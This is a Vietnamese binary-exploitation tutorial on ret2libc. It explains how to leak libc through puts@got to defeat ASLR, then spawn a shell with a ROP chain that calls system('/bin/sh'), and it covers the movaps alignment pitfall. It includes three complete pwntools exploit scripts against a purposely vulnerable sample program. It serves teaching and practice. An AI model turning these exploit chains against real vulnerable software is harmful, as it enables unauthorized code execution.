PWN · Phase 2 · Bài 5

ret2libc

NX bật (không chạy shellcode trên stack) nhưng ta có buffer overflow: tái dùng hàm có sẵn trong libc — gọi system("/bin/sh") bằng ROP. Bài này đi đủ 2 giai đoạn số thật glibc 2.31: leak libc qua puts(puts@got), rồi quay lại gọi system, kèm bẫy movaps alignment.

00 / TÓM TẮT 1 PHÚT

Bài này nói về cái gì?

Vấn đề: NX làm shellcode trên stack không chạy được. Nhưng libc đã có sẵn system và chuỗi "/bin/sh" — chỉ cần gọi chúng.

Cách: dùng overflow đặt một chuỗi ROP: pop rdi; ret → &"/bin/sh" → system. rdi là đối số đầu (SysV).

Rào ASLR: không biết libc base → leak trước: gọi puts(puts@got) để in địa chỉ thật của puts → libc.base = leak − libc.sym.puts. Rồi quay lại main và tấn công lần 2.

Nếu chỉ nhớ một điều: leak 1 địa chỉ libc (puts@got) → tính base → pop rdi; "/bin/sh"; system. Nhớ ret-align (movaps).

01 / NỀN TẢNG BẮT BUỘC

SysV calling convention & PLT/GOT

Trên x86-64 Linux, 6 đối số đầu truyền qua thanh ghi: rdi, rsi, rdx, rcx, r8, r9. Gọi system("/bin/sh") = đặt rdi = &"/bin/sh" rồi nhảy tới system. Ta không có lệnh mov rdi tùy ý, nên dùng gadget pop rdi; ret (lấy giá trị kế trên stack vào rdi).

Định nghĩa nhanh

ret2libc

ROP gọi hàm có sẵn trong libc.

gadget

Đoạn lệnh kết thúc ret dùng làm "mảnh" ROP.

PLT / GOT

PLT = bàn nhảy hàm; GOT = ô chứa địa chỉ thật (sau lazy bind).

leak

In một địa chỉ libc để phá ASLR.

pop rdi; ret

Gadget đặt đối số đầu.

movaps align

system cần rsp căn 0x10.

Vì sao cần leakASLR random hóa base libc mỗi lần chạy, nhưng offset nội bộ libc cố định. Leak 1 hàm (vd puts) → biết base → biết mọi thứ (system, "/bin/sh"). GOT chứa địa chỉ thật của hàm đã resolve → in GOT = leak.
02 / VÌ SAO CÓ KỸ THUẬT

NX đóng cửa shellcode, mở cửa ROP

NX (No-eXecute) đánh dấu stack/heap không thực thi → shellcode nhét vào đó không chạy. Nhưng code hợp lệ (libc, binary) vẫn thực thi được. ret2libc là ý tưởng gốc của ROP: thay vì chạy code mới, ta ghép lại code có sẵn — gọi thẳng một hàm thư viện mạnh (system) với đối số ta chọn. Đây là bước đệm trước các chuỗi ROP phức tạp hơn (rop_basics, ret2csu).

03 / GIAI ĐOẠN 1: LEAK LIBC · MỤC LÕI

puts(puts@got) → in địa chỉ thật

Ta gọi puts với đối số là địa chỉ ô GOT của puts — ô đó chứa địa chỉ thật của puts trong libc. puts in ra chuỗi tại đó (8 byte địa chỉ) → ta đọc = leak.

Bố cục stack giai đoạn 1 (số thật, no-PIE)

offset 0..71b"A"*72 — lấp buffer tới saved RIP
0x401263pop rdi; ret (gadget)
0x404018puts@got (đối số rdi = địa chỉ ô GOT puts)
0x401064puts@plt (gọi puts → in địa chỉ thật)
0x401186main (quay lại để tấn công lần 2)
# nhận leak:
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.puts    # 2.31: leak - 0x875a0
assert libc.address & 0xfff == 0        # base phải căn trang
Vì sao quay lại mainSau khi leak, ta chưa biết base lúc dựng payload giai đoạn 1 → không thể gọi system ngay. Nên kết thúc G1 bằng main (hoặc hàm có overflow) để nhập payload lần 2, lúc này đã có base.
04 / GIAI ĐOẠN 2: GỌI SYSTEM

pop rdi; "/bin/sh"; system — và movaps

offset 0..71b"A"*72
0x40101aret (gadget trơn — CĂN rsp về 0x10)
system+..pop rdi; ret
libc+0x1b45bd&"/bin/sh" (rdi)
libc+0x52290system → system("/bin/sh")

Bẫy movaps alignment (giải thích)

system (qua do_system) dùng lệnh SSE movaps xmmword [rsp+N], xmm0 — lệnh này yêu cầu địa chỉ căn 16. Khi ta ROP, số lượng "return" lẻ có thể làm rsp lệch 8 (căn 0x8 thay vì 0x10) → movaps raise SIGSEGV ngay trong system. Khắc phục: chèn một gadget ret (pop 8 byte "ảo") trước chuỗi gọi để dịch rsp 8 byte về bội số 16.

Dấu hiệu movapsCrash tại một địa chỉ trong libc (không phải payload), backtrace có do_system/movaps → thêm/bớt 1 gadget ret. Nếu crash khi CÓ ret-align thì bỏ nó đi (đã căn sẵn).

Bật/tắt ret-align để thấy payload đổi. Giá trị dưới là số thật mẫu (no-PIE, libc base 0x7ffff7dc0000).

07 / EXPLOIT ĐẦY ĐỦ

  
2 giai đoạn hoàn chỉnh (glibc 2.31)

  
// vuln.c — gcc vuln.c -o vuln -fno-stack-protector -no-pie  (NX on mặc định)
int main(){ char buf[0x40]; read(0, buf, 0x200); return 0; }   // overflow

  

    
    
    
  


  


# BẢN A — số thật 2.31, 2 giai đoạn, có ret-align.
from pwn import *
exe  = ELF("./vuln", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
p = process(exe.path)

OFF      = 72                 # offset tới saved RIP (cyclic)
pop_rdi  = 0x401263
ret      = 0x40101a           # gadget ret (align)

# ---- Giai đoạn 1: leak puts ----
g1  = b"A"*OFF
g1 += p64(pop_rdi) + p64(exe.got.puts) + p64(exe.plt.puts) + p64(exe.sym.main)
p.send(g1)
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.puts       # leak - 0x875a0
assert libc.address & 0xfff == 0
log.success(f"libc = {hex(libc.address)}")

# ---- Giai đoạn 2: system("/bin/sh") ----
binsh = next(libc.search(b"/bin/sh"))
g2  = b"A"*OFF
g2 += p64(ret)                            # CĂN rsp 0x10 (movaps)
g2 += p64(pop_rdi) + p64(binsh) + p64(libc.sym.system)
p.send(g2)
p.interactive()


Thành thậtSố pop_rdi=0x401263, ret=0x40101a, OFF=72 là của binary mẫu — của bạn khác (ROPgadget/cyclic). Offset libc 0x875a0/0x52290 là glibc 2.31 Ubuntu 20.04; dùng libc.sym để robust. Nếu crash trong system → thêm/bớt p64(ret).

  


  


# BẢN B — pwntools ROP class lo gadget + align tự động.
from pwn import *
context.binary = exe = ELF("./vuln", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
p = process(exe.path)
OFF = 72

# G1: leak qua ROP.call
r = ROP(exe)
r.call(exe.plt.puts, [exe.got.puts])
r.call(exe.sym.main)
p.send(b"A"*OFF + r.chain())
libc.address = u64(p.recvline().strip().ljust(8,b"\x00")) - libc.sym.puts

# G2: system, ROP tự chèn ret-align
r2 = ROP(libc)
r2.raw(r2.find_gadget(["ret"])[0])      # align
r2.system(next(libc.search(b"/bin/sh")))
p.send(b"A"*OFF + r2.chain())
p.interactive()


MẹoROP(libc).system(binsh) tự tìm pop rdi; ret. Thêm r2.raw(ret) để căn movaps. In hex(libc.address) kiểm (kết thúc 000).

  


  


# BẢN C — pwnld: leak helper + rebase.
from pwnld import *
context.binary = exe = ELF("./vuln", checksec=False); libc = get_libc("./libc.so.6")
p = start(); OFF = 72
r = ROP(exe); r.call(exe.plt.puts, [exe.got.puts]); r.call(exe.sym.main)
sl(b"A"*OFF + r.chain())
rebase_libc(leak=u64(rl().strip().ljust(8,b"\x00")), sym="puts")   # base = leak - LIBC.sym.puts
r2 = ROP(LIBC); r2.raw(r2.find_gadget(["ret"])[0]); r2.system(next(LIBC.search(b"/bin/sh")))
sl(b"A"*OFF + r2.chain()); ia()


pwnldrebase_libc(leak, sym="puts") tự trừ LIBC.sym.puts. Phần ROP vẫn dùng pwntools ROP class.

09 / GỠ LỖI

  
Khi không ra shell

  

    
movaps crash
rsp không căn 0x10. Thêm/bớt 1 gadget ret trước system.

    
Offset sai
pop_rdi không nhận đúng đối số. Dò lại cyclic.

    
Leak = rác
puts gặp null sớm, hoặc đọc nhầm. In raw output.

    
Không có pop rdi
Dùng ret2csu để set rdi, hoặc gadget khác.

    
PIE bật
Cần leak ELF base trước (địa chỉ 0x55…). Gadget/GOT là offset + base.

    
Full RELRO
GOT read-only — leak vẫn được (chỉ đọc), nhưng không ghi GOT; ret2libc không cần ghi GOT nên vẫn chạy.

one_gadget thay systemThay vì pop rdi; binsh; system, có thể nhảy thẳng one_gadget (libc.address + 0xe3b01) nếu constraint thỏa — gọn hơn, khỏi lo rdi/binsh. Thử cả 3 gadget.

  
▸ ret2libc không leak (ret2plt leak sẵn)
  
Nếu binary có sẵn hàm in (puts trong PLT) và GOT Partial RELRO, giai đoạn 1 luôn khả thi. Một số đề cho sẵn leak (in địa chỉ libc) → bỏ G1, vào thẳng G2. Hoặc dùng ret2dlresolve khi KHÔNG có hàm leak nào.
